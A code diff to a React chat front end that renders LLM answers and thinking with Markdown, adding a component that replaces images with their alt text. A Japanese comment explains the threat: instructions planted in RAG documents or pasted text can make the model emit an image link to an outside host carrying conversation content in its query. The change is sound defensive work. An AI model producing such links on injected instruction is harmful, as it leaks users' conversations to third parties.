@@ -1,7 +1,7 @@
 'use client'
 
 import { useState, useRef, useEffect, FormEvent } from 'react'
-import ReactMarkdown from 'react-markdown'
+import ReactMarkdown, { type Components } from 'react-markdown'
 import remarkGfm from 'remark-gfm'
 import remarkMath from 'remark-math'
 import remarkCjkFriendly from 'remark-cjk-friendly'
@@ -45,6 +45,16 @@ type ChatStreamPayload = {
 
 // /analytics などへ画面遷移して戻ってきても会話が消えないよう、タブ内で保持する(sessionStorage)。
 const MESSAGES_STORAGE_KEY = 'handson-chat-messages'
+
+// LLMの出力(回答・思考過程)を表示するときのMarkdown設定。画像は読み込まず代替テキストだけ表示する。
+// 画像を表示すると、RAG資料や貼り付けたテキストに仕込まれた指示でモデルに
+// ![](https://外部/?q=会話内容) を出力させ、ブラウザの画像読み込みで会話内容を外部へ送らせる
+// ことができてしまうため。
+const LLM_MARKDOWN_COMPONENTS: Components = {
+  img({ alt }) {
+    return <span className="text-gray-500 dark:text-zinc-400">[画像: {alt || '（説明なし）'}]</span>
+  },
+}
 
 const TOKEN_COLORS = [
   'bg-rose-100 dark:bg-rose-900/40',
@@ -786,6 +796,7 @@ export default function Home() {
                         <div className="px-3 py-2 text-xs text-amber-900 dark:text-amber-300 bg-amber-50/60 dark:bg-amber-900/10 border-t border-amber-200 dark:border-amber-800 max-h-48 overflow-y-auto prose prose-xs dark:prose-invert max-w-none [&_*]:text-amber-900 dark:[&_*]:text-amber-300 [&_h1]:text-sm [&_h2]:text-sm [&_h3]:text-xs [&_pre]:bg-amber-100 dark:[&_pre]:bg-amber-900/30">
                           <ReactMarkdown
                             remarkPlugins={[remarkGfm, remarkCjkFriendly]}
+                            components={LLM_MARKDOWN_COMPONENTS}
                           >
                             {msg.thinking}
                           </ReactMarkdown>
@@ -854,6 +865,7 @@ export default function Home() {
                               <ReactMarkdown
                                 remarkPlugins={[remarkGfm, remarkMath, remarkCjkFriendly]}
                                 rehypePlugins={[rehypeKatex]}
+                                components={LLM_MARKDOWN_COMPONENTS}
                               >
                                 {displayedContent}
                               </ReactMarkdown>
